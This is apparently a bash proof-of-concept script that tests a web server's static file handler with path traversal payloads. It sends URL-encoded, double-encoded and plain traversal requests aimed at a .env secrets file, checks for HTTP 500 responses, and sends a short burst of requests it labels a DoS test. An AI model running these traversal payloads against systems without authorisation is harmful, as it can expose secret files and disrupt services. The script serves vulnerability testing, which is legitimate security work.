#!/bin/bash

# POC: HTTP 500 Error on URL-Encoded Path Traversal - DoS Vector
# This script demonstrates how URL-encoded path traversal sequences
# cause HTTP 500 errors in the static file handler

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-8081}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "HTTP 500 on URL-Encoded Path Traversal DoS"
echo "=========================================="
echo "Target: ${BASE_URL}/static/"
echo ""

# Test 1: Normal static file request (should work)
echo "[*] Test 1: Normal static file request"
RESPONSE=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/style.css" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "    URL: ${BASE_URL}/static/style.css"
echo "    HTTP Status: ${HTTP_CODE}"
if [ "$HTTP_CODE" != "500" ]; then
    echo "    ✓ Normal request works (expected: 200 or 404, got: ${HTTP_CODE})"
else
    echo "    ✗ Unexpected 500 error"
fi
echo ""

# Test 2: URL-encoded single slash traversal (..%2f)
echo "[*] Test 2: URL-encoded traversal (..%2f.env)"
RESPONSE=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/..%2f.env" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "    URL: ${BASE_URL}/static/..%2f.env"
echo "    HTTP Status: ${HTTP_CODE}"
if [ "$HTTP_CODE" == "500" ]; then
    echo "    ✓ VULNERABLE: HTTP 500 error detected (URL-encoded traversal)"
    echo "    Response snippet: $(echo "$BODY" | head -c 80)..."
else
    echo "    Note: HTTP Status ${HTTP_CODE}"
fi
echo ""

# Test 3: Double-encoded traversal (..%252f)
echo "[*] Test 3: Double URL-encoded traversal (..%252f.env)"
RESPONSE=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/..%252f.env" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "    URL: ${BASE_URL}/static/..%252f.env"
echo "    HTTP Status: ${HTTP_CODE}"
if [ "$HTTP_CODE" == "500" ]; then
    echo "    ✓ VULNERABLE: HTTP 500 error detected (double-encoded traversal)"
    echo "    Response snippet: $(echo "$BODY" | head -c 80)..."
else
    echo "    Note: HTTP Status ${HTTP_CODE}"
fi
echo ""

# Test 4: Unencoded traversal (for comparison)
echo "[*] Test 4: Unencoded traversal (../.env) - for comparison"
RESPONSE=$(curl -s -w "\n%{http_code}" "${BASE_URL}/static/../.env" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo "    URL: ${BASE_URL}/static/../.env"
echo "    HTTP Status: ${HTTP_CODE}"
if [ "$HTTP_CODE" != "500" ]; then
    echo "    ✓ Unencoded traversal returns ${HTTP_CODE} (expected behavior, not 500)"
else
    echo "    Note: HTTP Status ${HTTP_CODE}"
fi
echo ""

# Test 5: Multiple encoded traversals in rapid succession (DoS test)
echo "[*] Test 5: Rapid requests with URL-encoded traversal (simulating DoS)"
echo "    Sending 5 requests with ..%2f payload..."
ERROR_COUNT=0
for i in {1..5}; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}/static/..%2ftest${i}" 2>/dev/null)
    if [ "$HTTP_CODE" == "500" ]; then
        ((ERROR_COUNT++))
    fi
done
echo "    500 errors received: ${ERROR_COUNT}/5"
if [ $ERROR_COUNT -gt 0 ]; then
    echo "    ✓ DoS potential confirmed: Multiple 500 errors from encoded traversal"
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "=========================================="